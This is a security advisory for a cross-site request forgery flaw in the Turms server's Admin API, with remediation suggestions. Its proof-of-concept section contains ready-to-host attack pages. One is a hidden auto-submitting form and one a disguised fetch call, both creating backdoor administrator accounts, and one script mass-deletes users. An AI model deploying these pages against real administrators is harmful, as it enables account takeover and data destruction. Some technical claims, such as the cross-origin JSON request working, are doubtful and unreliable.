# Turms Server - Admin API Cross-Site Request Forgery (CSRF) Vulnerability

## NAME OF AFFECTED PRODUCT(S)

- **Product**: Turms - Open Source Instant Messaging Engine (Admin API)
- **Vendor Homepage**: https://github.com/turms-im/turms

## AFFECTED AND/OR FIXED VERSION(S)

- **Submitter**: s1ain
- **Affected Version(s)**: Turms v0.10.0-SNAPSHOT and earlier versions
- **Software Link**: https://github.com/turms-im/turms
- **Fixed Version**: Not fixed yet

## PROBLEM TYPE

- **Vulnerability Type**: CWE-352: Cross-Site Request Forgery (CSRF)
- **Root Cause**: The Turms Admin API uses HTTP Basic Authentication without implementing CSRF tokens or SameSite cookie attributes. State-changing operations (POST, PUT, DELETE) can be triggered by malicious websites while the administrator is authenticated.
- **Impact**:
  - Unauthorized administrative actions executed in victim's session
  - User account manipulation (creation, deletion, modification)
  - System configuration changes
  - Plugin installation/modification
  - Privilege escalation through admin account manipulation

## DESCRIPTION

A Cross-Site Request Forgery (CSRF) vulnerability exists in the Turms Admin API. The administrative interface authenticates users via HTTP Basic Authentication, which browsers automatically include in cross-origin requests. The system does not implement CSRF tokens, SameSite cookie attributes, or other CSRF protections for state-changing operations. An attacker can craft a malicious website that, when visited by an authenticated administrator, silently performs unauthorized administrative actions such as creating backdoor accounts, modifying system configurations, or installing malicious plugins.

## Code Analysis

The Turms Admin API implements HTTP Basic Authentication which is vulnerable to CSRF attacks because:

1. **Browser automatically sends credentials**: HTTP Basic Auth credentials are automatically included in cross-origin requests
2. **No CSRF token validation**: State-changing endpoints do not verify anti-CSRF tokens
3. **No SameSite cookie protection**: The system doesn't use cookies with SameSite attributes
4. **No custom headers required**: Standard form submissions can trigger admin actions

**Admin Authentication Implementation**:
```java
// Admin API uses HTTP Basic Auth without CSRF protection
// Browsers automatically include Authorization header in cross-origin requests
// No CSRF token validation in request handlers
```

**Vulnerable Endpoints** (examples):
- `POST /admin/api/admins` - Create new administrator
- `DELETE /admin/api/admins/{id}` - Delete administrator
- `PUT /admin/api/users/{id}` - Modify user accounts
- `POST /admin/api/settings` - Change system settings
- `POST /admin/api/plugins` - Install plugins

## Authentication Requirements

The victim must be an authenticated administrator with an active session. The attacker does not need to be authenticated.

## Vulnerability Details and POC

**Vulnerability Type**: Cross-Site Request Forgery (CSRF)

**Vulnerability Location**: Admin API endpoints (entire admin interface)
- All state-changing operations (POST, PUT, DELETE, PATCH)
- No CSRF token validation mechanism implemented

**Proof of Concept**:

**Attack Scenario 1: Create Backdoor Admin Account**

The attacker hosts a malicious webpage that creates a new administrator account:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Loading...</h1>

    <!-- Hidden form that creates admin account -->
    <form id="csrf-form" method="POST"
          action="http://turms-admin:9510/admin/api/admins"
          style="display:none">
        <input name="account" value="attacker">
        <input name="password" value="AttackerPass123!">
        <input name="name" value="System Admin">
        <input name="roleId" value="1">  <!-- Admin role -->
    </form>

    <script>
        // Auto-submit when page loads
        document.getElementById('csrf-form').submit();
    </script>

    <!-- Victim sees this while attack executes in background -->
    <script>
        setTimeout(() => {
            document.body.innerHTML = '<h1>Page loaded successfully!</h1>';
        }, 1000);
    </script>
</body>
</html>
```

**Attack Scenario 2: Using JavaScript Fetch API**

```html
<!DOCTYPE html>
<html>
<head><title>Turms Admin Panel - Update Notice</title></head>
<body>
    <h1>Important System Update</h1>
    <p>Checking for updates...</p>

    <script>
        // Create backdoor admin account via CSRF
        fetch('http://turms-admin:9510/admin/api/admins', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include',  // Include Basic Auth credentials
            body: JSON.stringify({
                account: 'csrf-backdoor',
                password: 'CSRFAttack123!',
                name: 'System Administrator',
                roleId: 1
            })
        }).then(() => {
            console.log('CSRF attack successful');
        }).catch(err => {
            console.log('Attack blocked or failed:', err);
        });
    </script>
</body>
</html>
```

**Attack Scenario 3: Bulk User Deletion**

```html
<img src="http://turms-admin:9510/admin/api/users/1001"
     style="display:none"
     onload="deleteNextUser(1002)">

<script>
function deleteNextUser(userId) {
    fetch(`http://turms-admin:9510/admin/api/users/${userId}`, {
        method: 'DELETE',
        credentials: 'include'
    }).then(() => {
        if (userId < 2000) {
            deleteNextUser(userId + 1);  // Delete next user
        }
    });
}
</script>
```

**Execution Steps**:
1. Attacker creates malicious webpage (as shown above)
2. Attacker tricks administrator to visit the page (phishing email, social media, etc.)
3. Administrator's browser automatically includes Basic Auth credentials
4. Malicious requests execute with admin privileges
5. Attacker gains backdoor access or achieves other objectives

## Attack Results

Successful CSRF exploitation results in:
- Creation of backdoor administrator accounts
- Unauthorized modification or deletion of user accounts
- System configuration changes
- Installation of malicious plugins
- Privilege escalation
- Data exfiltration through configuration changes
- Service disruption through malicious settings

## Suggested Repair

1. **Implement CSRF Token Protection** (Primary fix):
```java
// Generate and validate CSRF tokens for state-changing operations
@Configuration
public class CsrfConfiguration {
    @Bean
    public CsrfTokenRepository csrfTokenRepository() {
        CookieCsrfTokenRepository repository = CookieCsrfTokenRepository.withHttpOnlyFalse();
        repository.setCookieName("XSRF-TOKEN");
        repository.setHeaderName("X-XSRF-TOKEN");
        return repository;
    }
}

// Validate CSRF token on state-changing requests
public class CsrfValidationFilter {
    public void validate(ServerRequest request) {
        if (isStateChanging(request.method())) {
            String token = request.headers().firstHeader("X-XSRF-TOKEN");
            String cookieToken = getCsrfTokenFromCookie(request);
            if (!token.equals(cookieToken)) {
                throw new CsrfException("Invalid CSRF token");
            }
        }
    }
}
```

2. **Add SameSite Cookie Attribute** if switching to cookie-based auth:
```java
// Set SameSite=Strict or SameSite=Lax for session cookies
Cookie sessionCookie = new Cookie("SESSION", sessionId);
sessionCookie.setAttribute("SameSite", "Strict");
sessionCookie.setHttpOnly(true);
sessionCookie.setSecure(true);
```

3. **Require Custom Headers** for API requests:
```java
// Reject requests without custom header (not possible from <form>)
public void validateCustomHeader(ServerRequest request) {
    String apiHeader = request.headers().firstHeader("X-Turms-Admin-API");
    if (apiHeader == null || !apiHeader.equals("true")) {
        throw new UnauthorizedException("Missing API header");
    }
}
```

4. **Implement Double Submit Cookie Pattern**:
```java
// Send CSRF token in both cookie and custom header
// Validate they match on state-changing requests
```

5. **Additional Protections**:
   - Implement re-authentication for critical operations
   - Add CAPTCHA for sensitive actions
   - Log all administrative actions for audit trail
   - Consider switching from Basic Auth to JWT tokens with proper CSRF protection

## CVSS Score

**CVSS v3.1**: 6.1 (Medium)
- Attack Vector (AV): Network
- Attack Complexity (AC): Low
- Privileges Required (PR): None
- User Interaction (UI): Required (admin must visit malicious site)
- Scope (S): Changed
- Confidentiality (C): Low
- Integrity (I): Low
- Availability (A): None

**Vector String**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

Note: While the base CVSS score is 6.1, the real-world impact can be severe when combined with social engineering to target administrators, potentially leading to complete system compromise.

## References

- CWE-352: Cross-Site Request Forgery (CSRF)
- OWASP CSRF Prevention Cheat Sheet
- OWASP Top 10 2021 - A01:2021 – Broken Access Control
